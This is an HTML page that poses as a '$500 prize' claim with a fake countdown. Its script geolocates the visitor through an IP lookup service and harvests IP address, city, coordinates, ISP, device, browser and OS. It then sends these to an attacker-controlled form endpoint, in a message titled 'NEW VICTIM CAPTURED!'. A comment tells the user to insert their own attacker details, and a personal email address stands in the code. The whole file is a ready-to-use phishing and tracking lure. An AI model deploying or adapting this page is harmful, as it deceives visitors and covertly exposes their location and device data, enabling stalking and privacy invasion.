<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You've Won $500!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .prize-icon { 
            font-size: 80px; 
            margin-bottom: 20px; 
            animation: bounce 2s infinite; 
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        h1 { color: #667eea; margin-bottom: 20px; font-size: 2.5em; }
        .prize-amount { 
            font-size: 4em; 
            color: #ff6b6b; 
            font-weight: bold; 
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        p { color: #666; line-height: 1.8; margin-bottom: 30px; font-size: 1.1em; }
        .claim-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 60px;
            font-size: 1.3em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .claim-button:hover { 
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        .loading { display: none; margin-top: 30px; }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success { 
            display: none; 
            color: #28a745; 
            font-size: 1.8em; 
            margin-top: 30px;
            font-weight: bold;
        }
        .checkmark {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="prize-icon">üéâ</div>
        <h1>Congratulations!</h1>
        <div class="prize-amount">$500</div>
        <p>You've been selected as our lucky winner! Click the button below to claim your exclusive prize reward. This offer expires in 10 minutes!</p>
        <button class="claim-button" onclick="claimPrize()">üéÅ Claim My Prize Now!</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="color: #667eea; font-size: 1.2em;">Processing your claim...</p>
        </div>
        
        <div class="success" id="success">
            <div class="checkmark">‚úÖ</div>
            Prize claimed successfully!<br>
            <small style="font-size: 0.6em; color: #666;">Check your email for details</small>
        </div>
    </div>

    <script>
        // ‚ö†Ô∏è REPLACE THESE TWO LINES WITH YOUR INFO:
        const ATTACKER_EMAIL = "yasmineelhedhili@gmail.com";
        const FORMSPREE_ENDPOINT = "https://formspree.io/f/mrbrqjgl";

        async function claimPrize() {
            document.querySelector('.claim-button').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const data = await collectData();
            await sendEmail(data);
            
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }, 2500);
        }
        
        async function collectData() {
            let ipData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (error) {
                console.error('IP fetch error:', error);
            }
            
            const ua = navigator.userAgent;
            return {
                ip: ipData.ip || 'Unknown',
                city: ipData.city || 'Unknown',
                region: ipData.region || 'Unknown',
                country: ipData.country_name || 'Unknown',
                latitude: ipData.latitude || 0,
                longitude: ipData.longitude || 0,
                isp: ipData.org || 'Unknown',
                device: /Mobile|Android|iPhone|iPad/.test(ua) ? 'Mobile Device' : 'Desktop/Laptop',
                browser: getBrowser(ua),
                os: getOS(ua),
                screen: window.screen.width + 'x' + window.screen.height,
                timestamp: new Date().toLocaleString(),
                mapLink: ipData.latitude && ipData.longitude 
                    ? `https://www.openstreetmap.org/?mlat=${ipData.latitude}&mlon=${ipData.longitude}#map=15/${ipData.latitude}/${ipData.longitude}`
                    : 'No location'
            };
        }
        
        async function sendEmail(data) {
            try {
                const emailBody = `
üéØ NEW VICTIM CAPTURED!

üìç LOCATION:
- City: ${data.city}
- Region: ${data.region}  
- Country: ${data.country}

üåê IP: ${data.ip}
üè¢ ISP: ${data.isp}

üíª DEVICE:
- Type: ${data.device}
- OS: ${data.os}
- Browser: ${data.browser}
- Screen: ${data.screen}

üïê Time: ${data.timestamp}

üó∫Ô∏è Map: ${data.mapLink}
                `.trim();

                const formData = new FormData();
                formData.append('email', ATTACKER_EMAIL);
                formData.append('subject', 'üö® New Victim - IP Tracker Alert');
                formData.append('message', emailBody);

                await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
                
                console.log('Email sent!');
            } catch (error) {
                console.error('Email failed:', error);
            }
        }
        
        function getBrowser(ua) {
            if (ua.indexOf("Firefox") > -1) return "Firefox";
            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung";
            if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
            if (ua.indexOf("Edg") > -1) return "Edge";
            if (ua.indexOf("Chrome") > -1) return "Chrome";
            if (ua.indexOf("Safari") > -1) return "Safari";
            return "Unknown";
        }
        
        function getOS(ua) {
            if (ua.indexOf("Win") > -1) return "Windows";
            if (ua.indexOf("Mac") > -1) return "MacOS";
            if (ua.indexOf("Linux") > -1) return "Linux";
            if (ua.indexOf("Android") > -1) return "Android";
            if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
            return "Unknown";
        }
    </script>
</body>
</html>
